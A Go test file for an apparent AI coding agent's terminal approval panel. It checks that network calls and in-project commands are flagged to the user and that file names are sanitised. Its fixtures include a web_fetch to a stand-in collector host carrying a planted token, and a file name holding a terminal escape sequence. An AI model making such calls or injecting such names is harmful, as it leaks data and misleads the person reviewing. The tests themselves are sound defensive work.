package tui

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"mochiii/protocol"
)

// WHY YOU ARE BEING ASKED. An approval the configuration does not cover
// (mcp.Builtin.InPlace), and one line in the review. Each is a fact the daemon resolved and a sentence this client says;
// a prompt that asks without saying why is a prompt that gets a reflexive yes.

func webRequest(tool, args string) protocol.ToolApprovalRequest {
	return protocol.ToolApprovalRequest{
		CallID: "c1", Server: "builtin", Tool: tool, Arguments: args, Lane: protocol.LaneFirstParty,
		ReachesNetwork: true, ReadOnlyHint: true, Iteration: 2, MaxIterations: 8,
	}
}

// NO RED LINE SAYS WHY A WEB CALL WAS ASKED ABOUT (owner, 2026-11-21: "remove
// the red lines"). The daemon no longer asks about a web call the configuration
// allows; one the user's own "ask" puts here is a plain network call, said as
// one, in both clients.
func TestAWebPromptCarriesNoEgressLine(t *testing.T) {
	const url = "https://collector.example/c?d=PLANTED-NOTE-777"
	for _, req := range []protocol.ToolApprovalRequest{
		webRequest("web_fetch", `{"url":"`+url+`"}`),
		webRequest("web_search", `{"query":"what is PLANTED-NOTE-777"}`),
	} {
		panel := renderApprovalPanel(req)
		if !strings.Contains(panel, "LEAVES YOUR MACHINE") {
			t.Errorf("an asked-about web call no longer says it leaves the machine:\n%s", panel)
		}
		for _, gone := range []string{"THE AGENT WROTE THIS ADDRESS", "WRITTEN AFTER THE AGENT READ"} {
			if strings.Contains(panel, gone) {
				t.Errorf("the removed line %q is back:\n%s", gone, panel)
			}
		}
	}
	webview, err := os.ReadFile(filepath.Join("..", "vscode", "media", "main.js"))
	if err != nil {
		t.Fatal(err)
	}
	for _, gone := range []string{"egress_review", "THE AGENT WROTE THIS ADDRESS", "WRITTEN AFTER THE AGENT READ"} {
		if strings.Contains(string(webview), gone) {
			t.Errorf("clients/vscode/media/main.js still carries %q", gone)
		}
	}
}

func TestTheApprovalPanelSaysWhenACommandRunsInTheRealProject(t *testing.T) {
	req := protocol.ToolApprovalRequest{
		CallID: "c1", Server: "builtin", Tool: "sandbox_exec", Arguments: `{"command":"go test ./..."}`,
		Lane: protocol.LaneFirstParty, Confined: true, InPlace: true, Iteration: 1, MaxIterations: 8,
	}
	panel := renderApprovalPanel(req)
	for _, want := range []string{"Run command: go test ./...", "RUNS IN YOUR REAL PROJECT", ".git/hooks"} {
		if !strings.Contains(panel, want) {
			t.Errorf("the panel for a command with no working copy does not say %q:\n%s", want, panel)
		}
	}
	// In a working copy the prompt is the one line it was.
	req.InPlace = false
	if panel = renderApprovalPanel(req); strings.Contains(panel, "REAL PROJECT") || strings.Contains(panel, "\n") {
		t.Errorf("a command in a working copy gained a warning:\n%s", panel)
	}
}

func TestTheReviewNamesWhatACommandChanged(t *testing.T) {
	text := workingCopyText(&protocol.WorkingCopyInfo{
		Checked: "go test ./...", Passed: true,
		ByCommand: []string{"m/m.go (go test ./...)", "evil\x1b[2Jname.go (make)"},
	})
	if !strings.Contains(text, byCommandNote+"m/m.go (go test ./...)") {
		t.Errorf("the review does not name the file a command changed:\n%s", text)
	}
	if strings.Contains(text, "\x1b") {
		t.Errorf("a file name's escape sequence reached the screen: %q", text)
	}
	if text := workingCopyText(&protocol.WorkingCopyInfo{Checked: "go test ./...", Passed: true}); strings.Contains(text, "changed by a command") {
		t.Errorf("a turn in which no command changed anything says one did:\n%s", text)
	}
}

// BOTH CLIENTS SAY THE SAME WORDS. The sentences are consent text; a VS Code
// user and a terminal user approving the same call must be told the same
// thing. Read from the extension's source, which is where its wording lives.
func TestBothClientsUseTheSameWordsForWhyYouAreAsked(t *testing.T) {
	read := func(rel string) string {
		t.Helper()
		b, err := os.ReadFile(filepath.Join("..", "vscode", filepath.FromSlash(rel)))
		if err != nil {
			t.Fatal(err)
		}
		// The extension writes one sentence across two string literals.
		return squashJSStrings(string(b))
	}
	webview := read("media/main.js")
	for name, sentence := range map[string]string{
		"inPlaceRisk": inPlaceRisk,
	} {
		if !strings.Contains(webview, sentence) {
			t.Errorf("clients/vscode/media/main.js does not carry the TUI's %s word for word:\n  %s", name, sentence)
		}
	}
	if spec := read("src/specWorkflow.ts"); !strings.Contains(spec, byCommandNote) {
		t.Errorf("clients/vscode/src/specWorkflow.ts does not carry the TUI's byCommandNote word for word:\n  %s", byCommandNote)
	}
	for _, field := range []string{"in_place", "by_command"} {
		if !strings.Contains(read("src/daemonClient.ts"), field) {
			t.Errorf("clients/vscode/src/daemonClient.ts does not declare %s", field)
		}
	}
}

// squashJSStrings joins a JavaScript string written as 'a ' + 'b' across lines
// into a b, so a sentence can be looked for whole.
//
// LINE ENDINGS FIRST. FOUND 2026-10-07 by CI, the only place this runs on
// Windows: git checks the extension's sources out there with CRLF, every line
// then ended "' +\r", nothing was joined, and the two sentences the extension
// writes across two lines were reported missing from a file that carries them
// word for word. A test that reads a source file reads it as that platform's
// checkout left it.
func squashJSStrings(src string) string {
	src = strings.ReplaceAll(src, "\r\n", "\n")
	var b strings.Builder
	lines := strings.Split(src, "\n")
	for i := 0; i < len(lines); i++ {
		line := lines[i]
		for strings.HasSuffix(strings.TrimRight(line, " "), "' +") && i+1 < len(lines) {
			head := strings.TrimSuffix(strings.TrimRight(line, " "), "' +")
			next := strings.TrimLeft(lines[i+1], " ")
			line = head + strings.TrimPrefix(next, "'")
			i++
		}
		b.WriteString(line)
		b.WriteByte('\n')
	}
	return b.String()
}

// The comparison above is only as good as this helper, and CI on Windows is
// where it was first wrong: the same source, checked out with CRLF, must read
// the same.
func TestASplitSentenceIsJoinedWhateverTheLineEndings(t *testing.T) {
	const unix = "risks.push('THE AGENT WROTE THIS, ' +\n      'and it is sent to that site');\nnext();\n"
	const sentence = "'THE AGENT WROTE THIS, and it is sent to that site'"
	joined := squashJSStrings(unix)
	if !strings.Contains(joined, sentence) {
		t.Fatalf("with LF the sentence is not joined: %q", joined)
	}
	windows := strings.ReplaceAll(unix, "\n", "\r\n")
	if got := squashJSStrings(windows); got != joined {
		t.Errorf("with CRLF, as git checks the file out on Windows, the same source reads differently:\n   got %q\n  want %q", got, joined)
	}
}
